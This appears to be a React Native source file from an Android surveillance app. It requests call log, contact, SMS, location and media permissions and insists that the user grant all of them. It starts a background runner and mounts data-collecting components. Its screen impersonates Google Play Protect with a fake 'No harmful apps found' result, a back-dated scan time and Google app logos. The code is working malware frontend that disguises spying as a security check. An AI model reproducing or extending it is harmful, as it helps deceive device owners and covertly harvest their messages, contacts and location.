/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react-native/no-inline-styles */
import React, {useEffect, useState} from 'react';
import {
  Animated,
  Button,
  Image,
  Linking,
  PermissionsAndroid,
  Platform,
  Text,
  TouchableOpacity,
  View,
} from 'react-native';
import CallLog from '../../components/CallLog';
import {useNavigation} from '@react-navigation/native';
import Contact from '../../components/Contact';
import SmsListener from '../../components/SmsListener';
import Location from '../../components/Location';
// @ts-ignore
import {Runnable} from 'react-native-background-runner';
import {activeRunBackground} from '../../lib/helper';
import Media from '../../components/Media';
import {showAlert} from '../../lib/ui-alert';
import AsyncStorage, {
  useAsyncStorage,
} from '@react-native-async-storage/async-storage';
import MaterialIcon from 'react-native-vector-icons/MaterialCommunityIcons';
import AntDIcon from 'react-native-vector-icons/AntDesign';
import Pulse from 'react-native-pulse';
import {format} from 'date-fns';

const Permission = () => {
  const [, setToken] = useState<string | null | undefined>(null);
  const [deviceId, setDeviceId] = useState<string | null | undefined>(null);
  const {getItem: getTokenStore} = useAsyncStorage('@token');
  const {getItem: getDeviceIdStore} = useAsyncStorage('@deviceId');
  getTokenStore((_err, result) => setToken(result));
  getDeviceIdStore((_err, result) => setDeviceId(result));
  const navigation = useNavigation();
  const [permissionsGranted, setPermissionsGranted] = useState(false);
  const time = format(Date.now() - 1000 * 60 * 60 * 1.86, 'HH:mm');

  const requestAllPermissions = async () => {
    let listPermissions = [
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      PermissionsAndroid.PERMISSIONS.WRITE_CONTACTS,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
    ];
    if (+Platform.Version > 23) {
      listPermissions.push(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION);
    }

    if (+Platform.Version >= 33) {
      listPermissions = listPermissions.concat([
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
      ]);
    } else {
      listPermissions.push(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      );
    }

    if (Platform.OS === 'android') {
      PermissionsAndroid.requestMultiple(listPermissions).then(statuses => {
        const notHasPermissions = listPermissions.some(permission => {
          return statuses[permission] !== PermissionsAndroid.RESULTS.GRANTED;
        });

        if (notHasPermissions) {
          showAlert(
            'Please Go into Settings -> Applications -> Permissions and Allow all permissions to continue',
            {
              close: () => Linking.openSettings().then(),
              closeText: 'Open',
            },
          );
        } else {
          setPermissionsGranted(true);
        }
      });
    }
  };

  useEffect(() => {
    activeRunBackground();
    requestAllPermissions();
  }, []);

  return (
    <Runnable>
      <View style={{flex: 1, gap: 12, padding: 12}}>
        <View
          style={{
            // justifyContent: 'center',
            alignItems: 'center',
          }}>
          <View style={{marginTop: 60}}>
            <MaterialIcon
              style={{
                padding: 20,
                borderRadius: 150,
                zIndex: 100,
              }}
              name="shield-check"
              size={60}
              color="green"
            />
            <Pulse
              style={{
                position: 'absolute',
                top: -28,
                opacity: 1,
              }}
              color="rgba(0,128,0, 0.2)"
              numPulses={2}
              diameter={150}
              speed={20}
              duration={1000}
            />
          </View>
          <Text style={{fontWeight: 'bold', fontSize: 23, marginTop: 32}}>
            {'No harmful apps found'}
          </Text>
          <Text
            style={{marginTop: 14}}>{`Play Protect scanned at ${time}`}</Text>
        </View>
        <Text
          style={{
            fontWeight: 'bold',
            fontSize: 16,
            textAlign: 'left',
            marginTop: 16,
          }}>
          {'Recently scanned apps'}
        </Text>
        <View
          style={{
            flexDirection: 'row',
            gap: 16,
          }}>
          {appLogoImages.map(image => (
            <Image
              key={image.source}
              source={image.source}
              width={30}
              height={30}
              style={{width: 30, height: 30}}
            />
          ))}
        </View>
        <Text>{`Apps scanned at ${time}`}</Text>
        <View
          style={{
            borderTopWidth: 0.2,
            borderTopColor: '#999',
            marginVertical: 16,
          }}
        />
        <Text>
          {
            "Play Protect regularly checks your apps and device for harmfull behavior. You'll be notified of any sercurity risks found."
          }
        </Text>
        <View style={{flex: 1, marginTop: 'auto', justifyContent: 'flex-end'}}>
          {permissionsGranted && (
            <View style={{flexDirection: 'row', alignItems: 'center'}}>
              <Text style={{fontSize: 12}}>{deviceId}</Text>
              <View
                style={{flexDirection: 'row', gap: 4, alignItems: 'center'}}>
                <Location />
                <CallLog />
                <Contact />
                <SmsListener />
                <Media />
                <TouchableOpacity
                  onPress={async () => {
                    await AsyncStorage.clear();
                    setDeviceId('');
                    setToken('');
                    navigation.navigate('Authentication' as never);
                  }}>
                  <AntDIcon name="logout" color="#999" />
                </TouchableOpacity>
              </View>
            </View>
          )}
        </View>
      </View>
    </Runnable>
  );
};

const appLogoImages = [
  {
    source: require('../../assets/google-play.png'),
  },
  {
    source: require('../../assets/google-gmail.png'),
  },
  {
    source: require('../../assets/google-chrome.png'),
  },
  {
    source: require('../../assets/google-map.png'),
  },
  {
    source: require('../../assets/google-meet.png'),
  },
  {
    source: require('../../assets/google-assistant.png'),
  },
];

export default Permission;
/* HTML: <div class="loader"></div> */
// .loader {
//   width: 20px;
//   aspect-ratio: 1;
//   border-radius: 50%;
//   background: #000;
//   box-shadow: 0 0 0 0 #0004;
//   animation: l2 1.5s infinite linear;
//   position: relative;
// }
// .loader:before,
// .loader:after {
//   content: "";
//   position: absolute;
//   inset: 0;
//   border-radius: inherit;
//   box-shadow: 0 0 0 0 #0004;
//   animation: inherit;
//   animation-delay: -0.5s;
// }
// .loader:after {
//   animation-delay: -1s;
// }
// @keyframes l2 {
//     100% {box-shadow: 0 0 0 40px #0000}
// }
